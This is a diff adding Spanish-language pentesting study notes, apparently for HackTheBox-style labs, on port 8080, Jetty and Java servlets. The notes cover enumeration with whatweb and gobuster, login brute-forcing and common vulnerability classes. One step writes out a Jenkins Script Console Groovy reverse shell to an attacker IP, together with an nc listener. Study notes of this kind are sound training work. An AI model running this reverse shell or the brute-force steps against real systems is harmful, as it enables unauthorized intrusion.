@@ -1,0 +1,133 @@
+🔌 Es un puerto alternativo para HTTP. Se usa cuando:
+
+    · No se usa el 80 (HTTP)
+    · Aplicaciones web corren en otro puerto
+
+💻 ¿Qué es Jetty?
+
+    Eclipse Jetty es:
+
+        · Un servidor web y contenedor de aplicaciones Java
+        · Similar a:
+    
+            · Apache Tomcat
+            · JBoss
+
+🧠 ¿Qué son los servlets?
+
+    👉 Los servlets son programas Java que:
+
+        · Procesan peticiones HTTP
+        · Generan respuestas dinámicas
+
+    👉 Son como:
+
+        · PHP en Apache
+        · Python en Flask
+
+    pero en Java
+
+🔗 Relación: 8080 + Jetty + Servlets
+
+    👉 Si ves algo como:
+
+        8080/tcp open  http
+        Server: Jetty
+
+    Significa:
+
+        · Hay una aplicación web corriendo en Java
+        · Usa Jetty como servidor
+        · Probablemente usa servlets
+
+
+🎯 Uso legítimo
+
+    · Aplicaciones web Java
+    · APIs REST
+    · Paneles administrativos
+    · Servicios internos
+
+🔐 En ciberseguridad (MUY IMPORTANTE)
+
+    Cuando ves 8080 + Jetty 👀
+
+    👉 significa superficie de ataque web
+
+🧪 Qué hacer en pentesting
+
+    🔍 1. Acceder al navegador
+    
+        http://IP:8080
+    
+    🔍 2. Enumerar
+    
+        whatweb http://IP:8080
+        gobuster dir -u http://IP:8080 -w wordlist.txt
+    
+    🔍 3. Buscar rutas típicas
+    
+        /admin
+        /manager
+        /login
+        /api
+        /console
+    
+    🔍 4. Intentar ataque de fuerza bruta
+
+        En el caso que tengamos un formulario de admin o login, podemos intentar realizar un ataque de fuerza bruta. 
+
+            Se crea un fichero con las contraseñas más comunes llamado password.txt y otro llamado usuario.txt para los usuarios.
+
+            Luego ejecutamos el script ataqueFuerzaBruta.py. Hay que tener en cuenta que hay que realizar los siguientes cambios: 
+
+                LOGIN_URL → Dominio junto al recurso del login al cual queremos acceder.
+                USERNAME → Nombre de usuario o fichero donde se encuentra el listado de posibles usuarios. 
+                PASSWORD_FILE → Fichero donde se encuentra el listado de posibles contraseñas. 
+
+    🔍 5. Buscar vulnerabilidades
+    
+        LFI / RFI
+        Deserialización Java
+        Upload de archivos
+        RCE
+
+    🔍 6. Crear una reverse shell
+
+        En caso de tratarse de Jenkins, una vez hayamos conseguido entrar al usuario de administrador, iremos a Manage Jenkins / Script Console e introduciremos el siguiente script: 
+
+            def cmd = ['/bin/bash','-c','bash -i >& /dev/tcp/<IP_local>/4444 0>&1']
+            def proc = new ProcessBuilder(cmd).start()
+
+        Una vez guardado, ejecutamos en nuestra máquina el listener con el siguiente comando: 
+
+            nc -nlvp 4444
+
+        Y ya estaremos dentro y navegamos hasta conseguir el objetivo. 
+
+🚨 Riesgos comunes
+
+    · Consolas admin expuestas
+    · Aplicaciones mal configuradas
+    · Credenciales débiles
+    · Endpoints ocultos
+
+🔥 Ejemplo típico HTB
+
+    1. Nmap → ves:
+
+        8080 open http Jetty
+    
+    2. Entras al navegador
+    
+    3. Encuentras:
+        
+        · login
+        · panel
+        · API
+    
+    4. Ataques:
+    
+        · brute force
+        · exploit web
+        · subida de shell
